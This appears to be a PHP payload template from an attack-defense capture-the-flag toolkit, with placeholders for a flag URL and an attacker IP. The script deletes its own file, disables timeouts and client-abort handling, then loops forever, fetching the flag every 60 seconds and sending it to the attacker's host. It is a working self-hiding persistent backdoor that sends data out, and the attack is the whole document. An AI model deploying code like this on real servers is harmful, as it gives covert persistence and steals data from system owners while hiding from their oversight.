<?php
unlink($_SERVER["SCRIPT_FILENAME"]);
ignore_user_abort(true);
set_time_limit(0);
while (true) {{
    $x = file_get_contents("{flag_url}");
	file_get_contents("http://{attack_ip}/recive.php?a=".$x);
    sleep(60);
}}
?>